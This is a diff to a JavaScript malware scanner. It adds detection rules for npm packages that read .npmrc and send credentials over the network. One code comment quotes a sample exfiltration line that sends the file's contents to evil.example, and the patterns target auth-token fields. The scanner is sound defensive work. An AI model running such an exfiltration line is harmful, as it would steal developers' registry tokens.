@@ -17,7 +17,6 @@ const SIGNAL_PATTERNS = {
     /process\s*\.\s*env\b/,
   ],
   SENSITIVE_PATH: [
-    /\.npmrc/i,
     // Match .env only as a file-path reference (preceded by quote, slash, or backtick),
     // not as a property access like `process.env.FOO` (F-16 false-positive fix).
     /['"\/`]\.env\b/i,
@@ -29,6 +28,34 @@ const SIGNAL_PATTERNS = {
     /[\/\\][\w.\-]{0,40}secret/i,
     /[\/\\][\w.\-]{0,40}passwd/i,
     /[\/\\][\w.\-]{0,40}shadow/i,
+  ],
+  // .npmrc is its own (weaker) signal, not a SENSITIVE_PATH (F-30 redo): every npm client,
+  // installer, and publish tool legitimately reads .npmrc to resolve the registry URL, so
+  // bare "reads .npmrc + makes a network call" is not evidence of anything by itself. It only
+  // becomes a credential-theft signal combined with an actual token-field reference, an
+  // explicit host override, or a hardcoded exfil destination below -- see the escalation rule
+  // in analyzeModule(). NOTE: the first cut of F-30 gated escalation solely on the literal
+  // string `_authToken` appearing in the module, which missed the more common real attack --
+  // reading the whole file and shipping it without ever naming the field
+  // (`fetch('http://evil.example/c?d='+fs.readFileSync('.npmrc'))`). The discriminator that
+  // actually holds is WHERE the data goes, not whether a field name is parsed out of it.
+  NPMRC_READ: [
+    /\.npmrc/i,
+  ],
+  // The npm auth token/password fields in a real .npmrc, e.g.
+  // `//registry.npmjs.org/:_authToken=...` or `_auth=...` -- these are the actual secret,
+  // as opposed to the plain `registry=` config line every package manager reads.
+  NPMRC_TOKEN: [
+    /_authToken/i,
+    /_auth\b/i,
+    /_password\b/i,
+    /authToken/i,
+  ],
+  // Explicit destination override alongside a network call, e.g. https.request({host:
+  // 'evil.example', ...}) -- a deliberate redirect, not the ambiguous case a bare hardcoded
+  // URL literal can be (see HARDCODED_EGRESS_CALL).
+  HOST_OPTION: [
+    /host\s*:\s*['"`][^'"`]+/,
   ],
   // Makes outbound network connections
   NETWORK_EGRESS: [
@@ -47,6 +74,16 @@ const SIGNAL_PATTERNS = {
     // Inline require("https").get/request — not caught by the patterns above
     /require\s*\(\s*['"]https?['"]\s*\)\s*\.\s*(?:get|request)\s*\(/,
   ],
+  // A quoted absolute URL passed directly as the argument of an actual network-call site --
+  // distinguishes theft (hardcodes the destination) from legit npm tooling (builds the URL
+  // from config, e.g. `fetch(`${registry}/${name}`)`). Anchored to the call site itself
+  // (not "any quoted URL anywhere in the file") so a legit fallback-default constant sitting
+  // next to a config-driven fetch -- e.g.
+  // `const registry = cfg.match(...) ? m[1] : 'https://registry.npmjs.org'` -- does not
+  // false-positive just because that literal exists somewhere in the module. Matched against
+  // raw `content`, not `scanSrc`: scanSrc already strips all https?:// literals wholesale
+  // (see the URL-stripping replace() below) so a content-based check here would never match.
+  HARDCODED_EGRESS_CALL: /(?:https?\s*\.\s*(?:get|request)|fetch|net\s*\.\s*(?:connect|createConnection)|socket\s*\.\s*connect|new\s+WebSocket|tls\s*\.\s*connect|require\s*\(\s*['"]https?['"]\s*\)\s*\.\s*(?:get|request))\s*\(\s*['"`](https?:\/\/[^'"`$\s]+)/g,
   // Generates or evaluates code at runtime
   DYNAMIC_CODE: [
     /\beval\s*\(/,
@@ -119,9 +156,22 @@ class BehaviorTracker {
       .replace(/https?:\/\/[^\s'"`]+/g, '')          // URLs
       .replace(/`[^`]*\$\{[^`]*`/g, '');             // template-literal URL builders
 
+    // Hardcoded-URL call sites, e.g. fetch('http://evil.example/...'). Extracted (not just
+    // matched) so the escalation rule below can tell a hardcoded exfil host apart from a
+    // hardcoded reference to the real npm registry (see hardcodedEgressNonRegistry).
+    const hardcodedEgressUrls = [];
+    for (const m of content.matchAll(SIGNAL_PATTERNS.HARDCODED_EGRESS_CALL)) {
+      hardcodedEgressUrls.push(m[1]);
+    }
+
     const signals = {
       sensitiveRead: matchesAny(scanSrc, SIGNAL_PATTERNS.SENSITIVE_READ),
       sensitivePath: matchesAny(scanSrc, SIGNAL_PATTERNS.SENSITIVE_PATH),
+      npmrcRead: matchesAny(scanSrc, SIGNAL_PATTERNS.NPMRC_READ),
+      npmrcToken: matchesAny(scanSrc, SIGNAL_PATTERNS.NPMRC_TOKEN),
+      hostOption: matchesAny(content, SIGNAL_PATTERNS.HOST_OPTION),
+      hardcodedEgress: hardcodedEgressUrls.length > 0,
+      hardcodedEgressNonRegistry: hardcodedEgressUrls.some(u => !/^https?:\/\/registry\.npmjs\.org\b/i.test(u)),
       envRead: matchesAny(content, SIGNAL_PATTERNS.ENV_READ),
       networkEgress: matchesAny(content, SIGNAL_PATTERNS.NETWORK_EGRESS),
       dynamicCode: matchesAny(content, SIGNAL_PATTERNS.DYNAMIC_CODE),
@@ -142,6 +192,28 @@ class BehaviorTracker {
         severity: 'CRITICAL',
         description: 'Module reads sensitive credentials and makes network calls',
       });
+    }
+
+    // Intra-module rule: .npmrc read + network egress. CRITICAL when there's a concrete
+    // theft signal -- an actual token/password field reference, an explicit host override, or
+    // a hardcoded destination that isn't the real npm registry. A hardcoded call-site URL that
+    // IS registry.npmjs.org (some legit tools hardcode it instead of building it from config)
+    // is downgraded to WARN rather than blocked, same as the config-built-URL case -- the
+    // registry host itself isn't a theft signal, only an unusual one.
+    if (signals.npmrcRead && signals.networkEgress) {
+      if (signals.npmrcToken || signals.hostOption || signals.hardcodedEgressNonRegistry) {
+        found.push({
+          rule: 'CREDENTIAL_EXFILTRATION',
+          severity: 'CRITICAL',
+          description: 'Module reads .npmrc and exfiltrates its contents, an auth token, or redirects to a hardcoded/overridden destination',
+        });
+      } else {
+        found.push({
+          rule: 'NPMRC_NETWORK_EGRESS',
+          severity: 'WARN',
+          description: 'Module reads .npmrc and makes network calls (common in npm tooling; monitor for token extraction or a hardcoded exfil destination)',
+        });
+      }
     }
 
     // Intra-module rule: bare env read + network egress → WARN only (common in normal apps).
